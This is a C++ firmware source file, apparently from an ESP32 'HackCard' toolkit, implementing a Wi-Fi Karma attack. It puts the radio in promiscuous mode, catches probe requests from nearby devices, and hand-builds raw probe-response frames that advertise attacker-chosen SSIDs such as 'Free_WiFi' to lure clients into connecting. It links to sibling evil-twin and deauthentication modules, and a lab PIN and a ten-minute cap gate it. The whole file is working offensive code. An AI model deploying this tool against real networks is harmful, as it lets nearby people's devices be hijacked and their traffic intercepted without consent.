#include "WifiKarmaApp.h"

#include "../../core/LabPin.h"
#include "../../core/Logger.h"
#include "../../platform/hal/HalWifiAp.h"
#include "../../platform/telemetry/StatusLed.h"
#if APP_WIFI_BEACON
#include "WifiBeaconApp.h"
#endif
#if APP_WIFI_EVIL_TWIN
#include "WifiEvilTwinApp.h"
#endif
#if APP_WIFI_MONITOR
#include "WifiMonitorApp.h"
#endif

#include <cstring>
#include <esp_wifi.h>

WifiKarmaApp WifiKarma;

namespace {

WifiKarmaApp* sKarma = nullptr;
constexpr uint32_t kMaxDurationMs = 10U * 60U * 1000U;
constexpr uint8_t kQueueSize = 12;

struct KarmaQueueEntry {
  char ssid[33];
  uint8_t mac[6];
  uint8_t channel;
};

KarmaQueueEntry sQueue[kQueueSize];
volatile uint8_t sHead = 0;
volatile uint8_t sTail = 0;

void parseSsids(const char* multiline, char out[8][33], uint8_t& count) {
  count = 0;
  if (!multiline) {
    return;
  }
  String s = multiline;
  int start = 0;
  while (start < s.length() && count < 8) {
    int nl = s.indexOf('\n', start);
    String line = nl >= 0 ? s.substring(start, nl) : s.substring(start);
    line.trim();
    if (line.length() > 0) {
      strlcpy(out[count], line.c_str(), 33);
      count++;
    }
    if (nl < 0) {
      break;
    }
    start = nl + 1;
  }
}

bool frameIsProbeRequest(const uint8_t* payload, uint16_t len, uint8_t srcMac[6]) {
  if (!payload || len < 24) {
    return false;
  }
  const uint8_t frameType = (payload[0] >> 2) & 0x03;
  const uint8_t subtype = (payload[0] >> 4) & 0x0F;
  if (frameType != 0 || subtype != 4) {
    return false;
  }
  memcpy(srcMac, payload + 10, 6);
  return true;
}

}  // namespace

void WifiKarmaApp::begin() {
  sKarma = this;
}

bool WifiKarmaApp::checkPin(const char* labPin, char* error, size_t errorLen) const {
  return labPinCheck(labPin, error, errorLen);
}

bool WifiKarmaApp::ensureLabIdle(char* error, size_t errorLen) const {
#if APP_WIFI_BEACON
  if (WifiBeacon.isRunning()) {
    strncpy(error, "Stop beacon lab first", errorLen - 1);
    return false;
  }
#endif
#if APP_WIFI_EVIL_TWIN
  if (WifiEvilTwin.isRunning()) {
    strncpy(error, "Stop evil-twin first", errorLen - 1);
    return false;
  }
#endif
#if APP_WIFI_MONITOR
  if (WifiMonitor.isSniffing() || WifiMonitor.isDeauthRunning()) {
    strncpy(error, "Stop monitor session first", errorLen - 1);
    return false;
  }
#endif
  if (!WifiAp.verifyRunning()) {
    strncpy(error, "HackCard AP must be running", errorLen - 1);
    return false;
  }
  return true;
}

void IRAM_ATTR WifiKarmaApp::onPromiscuous(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!sKarma || !sKarma->_running || !buf) {
    return;
  }
  if (type != WIFI_PKT_MGMT && type != WIFI_PKT_MISC) {
    return;
  }
  const wifi_promiscuous_pkt_t* pkt = static_cast<wifi_promiscuous_pkt_t*>(buf);
  uint8_t srcMac[6] = {0};
  if (!frameIsProbeRequest(pkt->payload, pkt->rx_ctrl.sig_len, srcMac)) {
    return;
  }
  sKarma->_probesSeen++;
  const uint8_t next = static_cast<uint8_t>((sHead + 1) % kQueueSize);
  if (next == sTail) {
    return;
  }
  KarmaQueueEntry& e = sQueue[sHead];
  e.ssid[0] = '\0';
  memcpy(e.mac, srcMac, 6);
  e.channel = pkt->rx_ctrl.channel;
  sHead = next;
}

void WifiKarmaApp::enablePromiscuous() {
  wifi_promiscuous_filter_t filter = {};
  filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
  esp_wifi_set_promiscuous_filter(&filter);
  esp_wifi_set_promiscuous_rx_cb(&WifiKarmaApp::onPromiscuous);
  esp_wifi_set_promiscuous(true);
}

void WifiKarmaApp::disablePromiscuous() {
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(nullptr);
}

bool WifiKarmaApp::sendProbeResponse(const char* ssid, const uint8_t* destMac, uint8_t channel) {
  if (!ssid || !destMac) {
    return false;
  }
  const uint8_t bssid[6] = {0x02, 0x00, 0x00, 0x00, 0x00, 0x01};
  const size_t ssidLen = strnlen(ssid, 32);
  uint8_t frame[128];
  int pos = 0;
  frame[pos++] = 0x50;
  frame[pos++] = 0x00;
  frame[pos++] = 0x00;
  frame[pos++] = 0x00;
  memcpy(&frame[pos], destMac, 6);
  pos += 6;
  memcpy(&frame[pos], bssid, 6);
  pos += 6;
  memcpy(&frame[pos], bssid, 6);
  pos += 6;
  frame[pos++] = 0x00;
  frame[pos++] = 0x00;
  frame[pos++] = 0x00;
  frame[pos++] = 0x00;
  frame[pos++] = 0x00;
  frame[pos++] = 0x00;
  frame[pos++] = 0x00;
  frame[pos++] = 0x00;
  frame[pos++] = static_cast<uint8_t>(100);
  frame[pos++] = 0x00;
  frame[pos++] = 0x01;
  frame[pos++] = 0x08;
  frame[pos++] = 0x82;
  frame[pos++] = 0x84;
  frame[pos++] = 0x8b;
  frame[pos++] = 0x96;
  frame[pos++] = 0x0c;
  frame[pos++] = 0x12;
  frame[pos++] = 0x18;
  frame[pos++] = 0x24;
  frame[pos++] = 0x03;
  frame[pos++] = 0x01;
  frame[pos++] = channel > 0 ? channel : static_cast<uint8_t>(WifiAp.getChannel());
  frame[pos++] = 0x00;
  frame[pos++] = static_cast<uint8_t>(ssidLen);
  memcpy(&frame[pos], ssid, ssidLen);
  pos += static_cast<int>(ssidLen);
  if (channel > 0) {
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  }
  return esp_wifi_80211_tx(WIFI_IF_AP, frame, pos, false) == ESP_OK;
}

void WifiKarmaApp::drainQueue() {
  while (sTail != sHead) {
    KarmaQueueEntry& e = sQueue[sTail];
    const char* ssid = _ssidCount > 0 ? _ssids[0] : "Free_WiFi";
    if (_ssidCount > 1) {
      ssid = _ssids[_responsesSent % _ssidCount];
    }
    if (sendProbeResponse(ssid, e.mac, e.channel)) {
      _responsesSent++;
    }
    sTail = static_cast<uint8_t>((sTail + 1) % kQueueSize);
  }
}

WifiKarmaResult WifiKarmaApp::start(const char* labPin, const char* ssidsMultiline) {
  WifiKarmaResult result;
  if (!checkPin(labPin, result.error, sizeof(result.error))) {
    return result;
  }
  if (!ensureLabIdle(result.error, sizeof(result.error))) {
    return result;
  }
  parseSsids(ssidsMultiline, _ssids, _ssidCount);
  if (_ssidCount == 0) {
    strlcpy(_ssids[0], "Free_WiFi", 33);
    _ssidCount = 1;
  }
  _running = true;
  _endsMs = millis() + kMaxDurationMs;
  _responsesSent = 0;
  _probesSeen = 0;
  sHead = 0;
  sTail = 0;
  enablePromiscuous();
  Status.setScanning();
  Log.activity("wifi", "karma_start", "lab");
  result.success = true;
  return result;
}

WifiKarmaResult WifiKarmaApp::stop() {
  WifiKarmaResult result;
  if (!_running) {
    result.success = true;
    return result;
  }
  _running = false;
  disablePromiscuous();
  drainQueue();
  Status.setApActive(true);
  Status.setIdle();
  Log.activity("wifi", "karma_stop", "ok");
  result.success = true;
  return result;
}

void WifiKarmaApp::loop() {
  if (!_running) {
    return;
  }
  drainQueue();
  if (millis() >= _endsMs) {
    stop();
  }
}

String WifiKarmaApp::statusToJson() const {
  String json = "{\"running\":";
  json += _running ? "true" : "false";
  json += ",\"probes_seen\":";
  json += String(_probesSeen);
  json += ",\"responses_sent\":";
  json += String(_responsesSent);
  json += ",\"ssid_count\":";
  json += String(_ssidCount);
  json += "}";
  return json;
}
